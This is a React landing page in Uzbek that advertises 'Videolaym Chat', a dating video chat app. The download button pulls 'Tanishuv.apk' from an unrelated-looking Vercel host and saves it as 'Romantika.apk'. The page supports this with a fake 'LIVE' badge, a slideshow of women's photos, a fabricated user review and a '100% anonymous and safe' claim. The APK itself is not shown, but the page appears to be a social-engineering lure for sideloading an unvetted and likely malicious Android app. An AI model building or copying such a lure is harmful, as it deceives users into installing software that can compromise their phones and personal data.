import React, { useState, useEffect } from 'react';

// *** Иконки (SVG-компоненты для легкости) ***
const IconWrapper = ({ children, style }) => (
  <span style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', lineHeight: 0, ...style }}>
    {children}
  </span>
);

const Download = () => <IconWrapper>⬇️</IconWrapper>;
const MapPin = () => <IconWrapper>📍</IconWrapper>;
const Video = () => <IconWrapper>📹</IconWrapper>;
const Heart = () => <IconWrapper>❤️</IconWrapper>;

export default function App() {
  const [currentSlide, setCurrentSlide] = useState(0);

  // Ссылки на фото (оставил те же)
  const images = [
    '/img/girl/0c7ee9546d69ad240a4e944011998ea4.jpg',
    '/img/girl/4faef5daad2b2c52a098c7ea3953c3a7.jpg',
    '/img/girl/5fb67a057ad47ec7ae173e2e96f81a2a.jpg',
    '/img/girl/725c42c2a53f9a2f190e7ec46189ee1d.jpg',
    '/img/girl/5982ab0ef9b6389a0e24048349abc996.jpg',
    '/img/girl/e649d44ef6bada40e456ea8afb266434.jpg',
    '/img/girl/ed4618afa15544612b46f23005e856fe.jpg',
    '/img/girl/f00bcfe0547b96d50acefff7b5ee246f.jpg',
  ];

  // Слайд-шоу (автоматическое)
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % images.length);
    }, 3500); // Чуть медленнее для плавности
    return () => clearInterval(interval);
  }, [images.length]);

  const handleDownload = (e) => {
    e.preventDefault();
    const link = document.createElement('a');
    link.href = 'https://uzbekistan-info.vercel.app/docs/Tanishuv.apk';
    link.download = 'Romantika.apk';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    setTimeout(() => {
      window.location.href = '/thankyou2.html'; 
    }, 1000);
  };

  const steps = [
    { title: "1. Yuklab oling", icon: "📲" },
    { title: "2. Oching", icon: "🚀" },
    { title: "3. Ro'yxatdan o'ting", icon: "✅" },
    { title: "4. Tanishing", icon: "❤️" },
  ];

  return (
    <div style={styles.container}>
      {/* === ФОН (CSS Animation Only) === 
         Убрана зависимость от мыши для производительности
      */}
      <div style={styles.background.wrapper}>
        <div className="blob blob-1"></div>
        <div className="blob blob-2"></div>
        <div className="blob blob-3"></div>
      </div>

      {/* Мерцающие звездочки на фоне (статика) */}
      <div style={styles.background.sparkles}>
        {[...Array(12)].map((_, i) => (
          <div 
            key={i} 
            className="star-twinkle"
            style={{ 
              top: `${Math.random() * 100}%`, 
              left: `${Math.random() * 100}%`, 
              animationDelay: `${Math.random() * 5}s`,
              opacity: 0.4
            }}
          >✨</div>
        ))}
      </div>

      <div style={styles.contentWrapper}>
        
        {/* === ГЛАВНАЯ КАРТОЧКА === */}
        <div className="glass-card fadeIn" style={styles.card.container}>
          
          {/* Заголовок */}
          <div style={styles.header}>
            <div style={styles.badge}>🔥 O'zbekistonda №1</div>
            <h1 className="gradient-text">Videolaym Chat</h1>
            <p style={styles.subtitle}>
              Sizning tumaningizdagi qizlar bilan <br />
              <span style={{color: '#be185d', fontWeight: '700'}}>video orqali</span> gaplashing!
            </p>
          </div>

          {/* Слайд-шоу в стиле "Stories" */}
          <div style={styles.slideshow.wrapper}>
            <div className="story-ring">
              <div style={styles.slideshow.inner}>
                {images.map((src, index) => (
                  <img
                    key={index}
                    src={src}
                    alt="User"
                    style={{ 
                      ...styles.slideshow.image,
                      opacity: index === currentSlide ? 1 : 0,
                      transform: index === currentSlide ? 'scale(1)' : 'scale(1.1)'
                    }}
                  />
                ))}
                
                {/* Live Badge */}
                <div style={styles.liveBadge}>
                  <span className="blink-dot"></span> LIVE
                </div>
              </div>
            </div>
          </div>

          {/* Преимущества (тэги) */}
          <div style={styles.tags.container}>
            <div style={styles.tags.item}><MapPin /> Yonma-yon</div>
            <div style={styles.tags.item}><Video /> Video chat</div>
            <div style={styles.tags.item}><Heart /> Bepul</div>
          </div>

          {/* === ИНСТРУКЦИЯ (STEPS) === */}
          <div style={styles.steps.container}>
            <p style={styles.steps.title}>🚀 Boshlash juda oson:</p>
            <div style={styles.steps.grid}>
              {steps.map((step, i) => (
                <div key={i} style={styles.steps.item}>
                  <span style={{fontSize: '1.4em'}}>{step.icon}</span>
                  <span style={styles.steps.text}>{step.title}</span>
                </div>
              ))}
            </div>
            <div style={styles.steps.arrow}>👇</div>
          </div>

          {/* Кнопка скачивания */}
          <div style={styles.buttonWrapper}>
            <div className="glow-effect"></div>
            <button 
              onClick={handleDownload} 
              className="main-button hover-lift"
              style={styles.button}
            >
              <div style={{fontSize: '1.8em', marginRight: '12px'}} className="bounce"><Download /></div>
              <div style={{textAlign: 'left'}}>
                <div style={{fontSize: '0.85em', opacity: 0.9}}>Ilovani yuklab olish</div>
                <div style={{fontSize: '1.2em', fontWeight: '800', letterSpacing: '0.5px'}}>BEPUL O'RNATISH</div>
              </div>
            </button>
          </div>

          {/* Отзыв (Social Proof) */}
          <div style={styles.review}>
            <div style={styles.reviewAvatar}>👩</div>
            <p style={{fontSize: '0.9em', color: '#555'}}>
              <b>Malika:</b> "Zo'r ilova! O'zimga yaqin yigitni topdim."
              <br/>
              <span style={{color: '#f59e0b'}}>⭐⭐⭐⭐⭐</span>
            </p>
          </div>

        </div>

        <div style={styles.footer}>
          100% Anonim va Xavfsiz
        </div>

      </div>

      {/* === GLOBAL CSS === 
         Используем CSS классы для всех анимаций (производительность)
      */}
      <style>{`
        /* Анимация появления */
        .fadeIn { animation: fadeInUp 0.8s ease-out forwards; }
        
        @keyframes fadeInUp {
          from { opacity: 0; transform: translateY(30px); }
          to { opacity: 1; transform: translateY(0); }
        }

        /* Градиентный текст */
        .gradient-text {
          background: linear-gradient(to right, #db2777, #e11d48, #f59e0b);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          font-size: 2.2rem;
          font-weight: 800;
          margin: 8px 0;
          line-height: 1.1;
          letter-spacing: -1px;
        }

        /* Стеклянная карточка */
        .glass-card {
          background: rgba(255, 255, 255, 0.75);
          backdrop-filter: blur(20px);
          -webkit-backdrop-filter: blur(20px);
          border: 1px solid rgba(255, 255, 255, 0.8);
          box-shadow: 0 20px 40px -10px rgba(236, 72, 153, 0.2), 0 0 0 1px rgba(255,255,255,0.5);
          border-radius: 30px;
        }

        /* Анимация кнопки */
        .main-button {
          position: relative;
          overflow: hidden;
        }
        .main-button::after {
          content: '';
          position: absolute;
          top: 0; left: -100%;
          width: 50%; height: 100%;
          background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
          transform: skewX(-20deg);
          animation: shine 3s infinite;
        }
        @keyframes shine { 100% { left: 200%; } }

        .hover-lift { transition: transform 0.2s; }
        .hover-lift:active { transform: scale(0.96); }
        .bounce { animation: bounce 2s infinite; }
        @keyframes bounce { 0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 40% {transform: translateY(-6px);} 60% {transform: translateY(-3px);} }

        /* Story Ring Animation */
        .story-ring {
          padding: 4px;
          background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
          border-radius: 50%;
          display: inline-block;
          animation: rotate-gradient 3s linear infinite; /* Optional: if you want spinning ring, else remove animation */
        }

        /* Live Dot */
        .blink-dot {
          display: inline-block;
          width: 8px; height: 8px;
          background-color: white;
          border-radius: 50%;
          margin-right: 5px;
          animation: blink 1.5s infinite;
        }
        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.4;} 100% {opacity: 1;} }

        /* Background Blobs Animation */
        .blob {
          position: absolute;
          border-radius: 50%;
          filter: blur(60px);
          opacity: 0.6;
          z-index: -1;
          animation: float 10s ease-in-out infinite;
        }
        .blob-1 { top: -10%; left: -10%; width: 300px; height: 300px; background: #fbcfe8; animation-delay: 0s; }
        .blob-2 { bottom: 10%; right: -5%; width: 250px; height: 250px; background: #ddd6fe; animation-delay: -2s; }
        .blob-3 { top: 40%; left: 40%; width: 200px; height: 200px; background: #fed7aa; animation-delay: -4s; }

        @keyframes float {
          0%, 100% { transform: translate(0, 0); }
          50% { transform: translate(20px, -20px); }
        }

        .star-twinkle { position: absolute; font-size: 14px; animation: twinkle 3s infinite ease-in-out; color: #db2777; }
        @keyframes twinkle { 0%, 100% { opacity: 0.2; transform: scale(0.8); } 50% { opacity: 0.8; transform: scale(1.2); } }
      `}</style>
    </div>
  );
}

// *** СТИЛИ ***
const styles = {
  container: {
    minHeight: '100vh',
    position: 'relative',
    overflow: 'hidden',
    fontFamily: '-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
    background: '#fff', 
    display: 'flex',
    justifyContent: 'center',
    padding: '20px',
  },
  background: {
    wrapper: { position: 'absolute', inset: 0, overflow: 'hidden', zIndex: 0 },
    sparkles: { position: 'absolute', inset: 0, zIndex: 0, pointerEvents: 'none' }
  },
  contentWrapper: {
    position: 'relative',
    zIndex: 1,
    width: '100%',
    maxWidth: '440px', // Оптимальная ширина для мобильного вида
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
  },
  card: {
    container: {
      width: '100%',
      padding: '30px 20px',
      textAlign: 'center',
      marginTop: '20px',
    }
  },
  header: { marginBottom: '25px' },
  badge: {
    display: 'inline-block',
    padding: '6px 14px',
    backgroundColor: '#fff1f2',
    color: '#e11d48',
    borderRadius: '20px',
    fontSize: '0.8rem',
    fontWeight: '700',
    marginBottom: '10px',
    border: '1px solid #fecdd3'
  },
  subtitle: {
    color: '#4b5563',
    fontSize: '1rem',
    lineHeight: '1.5',
    margin: 0,
  },
  slideshow: {
    wrapper: { marginBottom: '25px', display: 'flex', justifyContent: 'center' },
    inner: {
      width: '240px',
      height: '240px',
      borderRadius: '50%',
      border: '4px solid white', // Белая рамка внутри цветного кольца
      position: 'relative',
      overflow: 'hidden',
      backgroundColor: '#f3f4f6',
    },
    image: {
      position: 'absolute', inset: 0, width: '100%', height: '100%', objectFit: 'cover', transition: 'all 0.8s ease'
    },
  },
  liveBadge: {
    position: 'absolute',
    bottom: '20px',
    left: '50%',
    transform: 'translateX(-50%)',
    backgroundColor: 'rgba(225, 29, 72, 0.9)',
    color: 'white',
    padding: '4px 12px',
    borderRadius: '12px',
    fontSize: '0.75rem',
    fontWeight: 'bold',
    display: 'flex',
    alignItems: 'center',
    boxShadow: '0 4px 6px rgba(0,0,0,0.2)'
  },
  tags: {
    container: { display: 'flex', justifyContent: 'center', gap: '8px', marginBottom: '30px', flexWrap: 'wrap' },
    item: {
      padding: '6px 12px',
      backgroundColor: 'rgba(255,255,255,0.6)',
      borderRadius: '12px',
      fontSize: '0.85rem',
      color: '#db2777',
      fontWeight: '600',
      display: 'flex',
      alignItems: 'center',
      gap: '6px',
      border: '1px solid rgba(236, 72, 153, 0.2)'
    }
  },
  steps: {
    container: {
      backgroundColor: 'rgba(255, 241, 242, 0.6)', // Розоватый фон для шагов
      borderRadius: '20px',
      padding: '20px',
      marginBottom: '25px',
      border: '1px solid rgba(253, 164, 175, 0.3)'
    },
    title: { margin: '0 0 15px 0', fontWeight: 'bold', color: '#be185d' },
    grid: { display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', textAlign: 'left' },
    item: { 
      backgroundColor: 'rgba(255,255,255,0.8)', 
      padding: '10px', 
      borderRadius: '12px', 
      display: 'flex', 
      alignItems: 'center', 
      gap: '8px',
      boxShadow: '0 2px 4px rgba(0,0,0,0.03)'
    },
    text: { fontSize: '0.8rem', fontWeight: '600', color: '#374151' },
    arrow: { marginTop: '10px', fontSize: '1.2rem', animation: 'bounce 2s infinite' }
  },
  buttonWrapper: { position: 'relative', width: '100%', marginBottom: '20px' },
  button: {
    width: '100%',
    background: 'linear-gradient(to right, #db2777, #f97316)',
    color: 'white',
    border: 'none',
    borderRadius: '20px',
    padding: '18px',
    cursor: 'pointer',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    boxShadow: '0 10px 25px -5px rgba(219, 39, 119, 0.5)',
  },
  review: {
    display: 'flex',
    alignItems: 'center',
    gap: '12px',
    backgroundColor: 'rgba(255,255,255,0.5)',
    padding: '12px',
    borderRadius: '16px',
    textAlign: 'left'
  },
  reviewAvatar: {
    width: '40px', height: '40px', backgroundColor: '#fce7f3', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '1.2rem'
  },
  footer: {
    marginTop: '20px',
    fontSize: '0.75rem',
    color: '#9ca3af',
    display: 'flex',
    alignItems: 'center',
    gap: '6px'
  }
};